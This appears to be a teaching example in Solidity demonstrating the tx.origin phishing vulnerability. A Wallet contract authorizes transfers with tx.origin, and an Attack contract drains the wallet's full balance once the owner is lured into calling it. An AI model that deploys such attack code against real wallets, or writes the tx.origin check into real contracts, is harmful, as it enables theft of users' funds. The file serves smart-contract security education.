// SPDX-License-Identifier: MIT

pragma solidity ^0.8.29;

// Phishing attack using tx.origin

contract Wallet {
    address public owner;
    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function transfer(address payable _to, uint256 amount) public {
        require(tx.origin == owner, "Only the owner can transfer funds");
        require(address(this).balance >= amount, "Insufficient balance");
        _to.transfer(amount);
    }
}

contract Attack {
    address payable public owner;
    Wallet public target;

    constructor(address _target) {
        owner = payable(msg.sender);
        target = Wallet(_target);
    }

    /* Phishing: If attacker can somehow fool the owner of target wallet to call this function, then
    tx.origin will be the owner of the target wallet, and the attacker can transfer all funds to his own address.
    target.transfer(owner, target.getBalance()); */
    function attack() public {
        target.transfer(owner, target.getBalance());
    }
}